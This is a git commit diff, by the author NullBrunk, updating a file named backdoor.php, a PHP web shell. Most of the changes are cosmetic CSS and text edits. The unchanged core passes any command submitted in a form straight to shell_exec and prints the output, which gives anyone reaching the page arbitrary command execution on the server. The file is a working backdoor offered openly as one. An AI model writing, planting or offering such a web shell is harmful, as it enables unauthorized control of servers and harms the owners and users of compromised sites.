aa40252ce4e930b751035371fb5e22e94cb08787
NullBrunk <106782577+NullBrunk@users.noreply.github.com>
2022-06-03 02:05:58 +0200

    Update backdoor.php

--- backdoor.php
+++ backdoor.php
@@ -2,75 +2,55 @@
 <html>
 	<head>
 
-	<title>BindShell by NullBrunk</title>
+	<title>PHPShell</title>
 	<meta charset="UTF-8" />
-	<meta name="description" content="" />
 
 	</head>
-
-	<!-- CSS STYLES -->
 	
-	<style>
-			body{
-				background-color: black;
-			}
+		<style>
 
-			a{
-				text-decoration: none;
-				color: green;
-				font-size: 200%
-			}
+				a{
+					text-decoration: none;
+					color: black;
+					font-size: 150%
+				}
 
-			p{
-				text-decoration: none;
-				color: red;
-				font-size: 150%
-			}
+				p{
+					text-decoration: none;
+					color: black;
+					font-size: 150%
+				}
 
-			fieldset{
-  				
-				border:2px solid green;
-    				-moz-border-radius:8px;
-    				-webkit-border-radius:8px;	
-    				border-radius:8px;	
-			}
+				fieldset{
+					border:2px solid black;
+					-moz-border-radius:8px;
+					-webkit-border-radius:8px;
+					border-radius:8px;
+				}
 
-			hr{
+				hr{
 
-				height: 1px;
-				background-color: #008000 ;
-				border: none;
-			}
-
-			.heading{
-				text-align: center;
-				font-size: 350%;
-				font-family: bold;
-				color: green;
-			}
-
-		</style>
-	
-	<!-- End of the CSS  -->
-	
-	
-		</head>
-
-	<div class="heading">
-		<font>PHP WebShell</font><br>
-	</div>
-
+					height: 1px;
+					background-color: #000000;
+					border: none;
+				}
+				.inputt{
+					height: 25px;
+					width: 1000px;
+				}
+				input{
+					height: 25px;
+					width: 70px;
+				}
+			</style>
 	<body>
 
 	<fieldset>	
 		<form action="" method="post">
-		<p>Command : <input type="text" name="$" /> <input type="submit" value="execute"></p>
-
+			<p> <input type="text", class="inputt" name="command" size="100" rows="100" /> <input type="submit" value="execute"></p>
 		</form>
-		<hr>
-
+			<hr>
 		<?php
-
 
 			if (isset($_POST['command'])) 
 			{
@@ -78,12 +58,9 @@
 				echo "<a><pre>".shell_exec($command)."</pre></a>";
 			}
 			else{
-				echo "Probleme occured";
+				echo "No command specified";
 			}
 		?>
-
 	</fieldset>
-
 	<body>
-
 </html>
